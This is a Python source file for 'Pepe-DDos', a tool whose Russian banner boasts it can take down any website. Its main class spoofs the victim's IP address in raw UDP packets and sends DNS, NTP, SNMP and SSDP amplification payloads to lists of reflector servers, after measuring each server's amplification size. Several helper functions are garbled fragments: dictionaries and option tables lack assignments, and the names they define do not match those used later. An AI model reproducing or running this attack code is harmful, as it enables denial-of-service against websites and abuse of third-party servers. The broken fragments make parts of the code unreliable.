#!/usr/bin/env python

#⣿⣿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠀⠙⠛⠿⠟⠋⠉⠁⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿
#⣿⣿⣿⡿⠋⠀⠸⠄⢀⣀⠠⠤⠤⣀⡀⠐⡄⠀⠀⠀⠀⠀⠾⠂⠈⠻⣿⣿⣿⣿
#⣿⣿⡟⠀⠀⠀⠠⠋⠁⠀⠀⠀⠀⠀⠉⠙⠻⠒⠚⠛⠛⠛⠛⠒⠒⠦⠘⢿⣿⣿
#⣿⠟⠀⠀⡆⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣶⣶⣧⣄⢀⣠⣤⣤⣶⣶⣶⣤⣤⣙⢿
#⠁⢸⠀⠸⠅⠀⠀⣴⣾⣿⣿⣿⣿⣿⡏⡉⠙⣿⣿⣼⣿⣿⣿⣿⣿⢋⡉⢻⣿⡆
#⣀⠀⠀⠀⠀⠀⠀⠀⢉⠛⠿⢿⣿⣿⣷⣧⣶⡿⠟⠸⠿⠿⣿⡿⠿⠶⠬⠾⠿⢃
#⠓⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠤⠤⠬⠭⠁⣤⠤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠔⠊⠁⠀⠀⠀⠑⠢⡄⠒⠒⠂⠰⣿⣿⣿  coded with <3 by Pepe-Devs
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿
#⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡈⣿
#⠀⠀⠀⠀⠀⠀⣼⣿⣧⣭⣭⣍⣛⣛⣛⡶⠶⠶⢦⣤⣤⣤⣤⣤⣴⣶⠿⠛⣡⣿
#⠀⠀⠀⠀⠰⢄⠈⠉⠉⠉⠉⠉⠉⠙⠛⠛⠿⠿⠿⠷⠶⠶⣶⣶⣶⡶⢟⣸⣿⣿
#⣄⣀⡀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿
#⠀⠀⠈⠉⠓⠒⠢⠤⠤⠤⠤⣤⣤⣤⣤⠤⠄⠀⠀⠀⢴⣶⣿⣿⣿⣿⣿⣿⣿⣿
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⣿⣿⣿⣿⣿⣿⠀⠀



# ИМПОРТИРУЕМ ВСЯКУЮ ФИГНЮ
import sys
import time
import socket
import struct
import threading
from random import randint
from optparse import OptionParser
from pinject import IP, UDP
from termcolor import colored

# ЛОГО (ПРОФИ ЗОВУТ ЕГО БАННЕР)
def banner():
    system("cls" if name == "nt" else "clear")
    print(colored( '''
⣿⣿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠀⠙⠛⠿⠟⠋⠉⠁⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿  
⣿⣿⣿⡿⠋⠀⠸⠄⢀⣀⠠⠤⠤⣀⡀⠐⡄⠀⠀⠀⠀⠀⠾⠂⠈⠻⣿⣿⣿⣿
⣿⣿⡟⠀⠀⠀⠠⠋⠁⠀⠀⠀⠀⠀⠉⠙⠻⠒⠚⠛⠛⠛⠛⠒⠒⠦⠘⢿⣿⣿
⣿⠟⠀⠀⡆⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣶⣶⣧⣄⢀⣠⣤⣤⣶⣶⣶⣤⣤⣙⢿  Добро пожаловать в Pepe-DDos.
⣿⠟⠀⠀⡆⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣶⣶⣧⣄⢀⣠⣤⣤⣶⣶⣶⣤⣤⣙⢿  Данный не замысловатый скрипт поможет вам уронить любой сайт!
⠁⢸⠀⠸⠅⠀⠀⣴⣾⣿⣿⣿⣿⣿⡏⡉⠙⣿⣿⣼⣿⣿⣿⣿⣿⢋⡉⢻⣿⡆  
⣀⠀⠀⠀⠀⠀⠀⠀⢉⠛⠿⢿⣿⣿⣷⣧⣶⡿⠟⠸⠿⠿⣿⡿⠿⠶⠬⠾⠿⢃  Разработчики:
⠓⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠤⠤⠬⠭⠁⣤⠤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾  GitHub: 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠔⠊⠁⠀⠀⠀⠑⠢⡄⠒⠒⠂⠰⣿⣿⣿  Telegram:
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡈⣿
⠀⠀⠀⠀⠀⠀⣼⣿⣧⣭⣭⣍⣛⣛⣛⡶⠶⠶⢦⣤⣤⣤⣤⣤⣴⣶⠿⠛⣡⣿
⠀⠀⠀⠀⠰⢄⠈⠉⠉⠉⠉⠉⠉⠙⠛⠛⠿⠿⠿⠷⠶⠶⣶⣶⣶⡶⢟⣸⣿⣿
⣄⣀⡀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿
⠀⠀⠈⠉⠓⠒⠢⠤⠤⠤⠤⣤⣤⣤⣤⠤⠄⠀⠀⠀⢴⣶⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀''','magenta'))

# Здраствуйте, чем помочь?	
def help():
'Файл расширения DNS и домены для разрешения (например: dns.txt:[evildomain.com|domains_file.txt]',
'Файл усиления NTP',
'Файл расширения SNMP',
'Файл расширения SSDP',
'Количество потоков (по умолчанию=1)' )    ()
    
# КОМАНДЫ	
def option():
	(('-d', '--dns'), dict(dest='dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])),
	(('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
	(('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
	(('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
	(('-a', '--потоки'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])) )
    ()

#АНАНАСЫ АТАКУЮТ!!!    
def attack():
    
        '  Отправлено!  '
	'|    Траффик   '
	'|    Пакет(ы)  '
	'|     Бит(ы)   '
	'\n{}').format('-'*63)
	
# ТУТ ВВОДИМ ПОРТ	
def port():  

	'dns': 53,
	'ntp': 123,
	'snmp': 161,
	'ssdp': 1900 
		
def payload():
	
	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
			'\x00\x00\x00\x00\x00\x00'),
	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
		'\x01\x02\x01\x05\x00'),
	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
		
		
class PepeDDos(object): # тут начинается веселье (капсом устал писать)
	
	def __init__(self, target, threads, domains, event):
		self.target = target
		self.threads = threads
		self.event = event
		self.domains = domains
	def stress(self):
		for i in range(self.threads):
			t = threading.Thread(target=self.__attack)
			t.start()
	def __send(self, sock, soldier, proto, payload):
		'''
			Отправить ненастоящую жабу
		'''
		udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
		ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
		sock.sendto(ip+udp+payload, (soldier, PORT[proto]))
	def GetAmpSize(self, proto, soldier, domain=''):
		'''
			усиление
		'''
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.settimeout(2)
		data = ''
		if proto in ['ntp', 'ssdp']:
			packet = payload[proto]
			sock.sendto(packet, (soldier, PORT[proto]))
			try:
				while True:
					data+= sock.recvfrom(65535)[0]
			except socket.timeout:
				sock.close()
				return len(data), len(packet)
		if proto=='dns':
			packet = self.__GetDnsQuery(domain)
		else:
			packet = payload[proto]
		try:
			sock.sendto(packet, (soldier, PORT[proto]))
			data, _ = sock.recvfrom(65535)
		except socket.timeout:
			data = ''
		finally:
			sock.close()
		return len(data), len(packet)
	def __GetQName(self, domain):
		'''
			QNAME Доменное имя, представленное в виде последовательности меток.
                        где каждая метка состоит из длины
                        октет, за которым следует это количество октетов.
		'''
		labels = domain.split('.')
		QName = ''
		for label in labels:
			if len(label):
				QName += struct.pack('B', len(label)) + label
		return QName
	def __GetDnsQuery(self, domain):
		id = struct.pack('H', randint(0, 65535))
		QName = self.__GetQName(domain)
		return PAYLOAD['dns'].format(id, QName)
	def __attack(self):
		global npackets
		global nbytes
		_files = files
		for proto in _files:	
			f = open(_files[proto][FILE_NAME], 'r')
			_files[proto].append(f)		
		sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		i = 0
		while self.event.isSet():
			for proto in _files:
				soldier = _files[proto][FILE_HANDLE].readline().strip()
				if soldier:
					if proto=='dns':
						if not amplification[proto].has_key(soldier):
							amplification[proto][soldier] = {}
						for domain in self.domains:
							if not amplification[proto][soldier].has_key(domain):
								size, _ = self.GetAmpSize(proto, soldier, domain)
								if size==0:
									break
								elif size<len(PAYLOAD[proto]):
									continue
								else:
									amplification[proto][soldier][domain] = size
							amp = self.__GetDnsQuery(domain)
							self.__send(sock, soldier, proto, amp)
							npackets += 1
							i+=1
							nbytes += amplification[proto][soldier][domain]
					else:
						if not amplification[proto].has_key(soldier):
							size, _ = self.GetAmpSize(proto, soldier)
							if size<len(PAYLOAD[proto]):
								continue
							else:
								amplification[proto][soldier] = size
						amp = PAYLOAD[proto]
						npackets += 1
						i+=1
						nbytes += amplification[proto][soldier]
						self.__send(sock, soldier, proto, amp)
				else:
					_files[proto][FILE_HANDLE].seek(0)
		sock.close()
		for proto in _files:
			_files[proto][FILE_HANDLE].close()
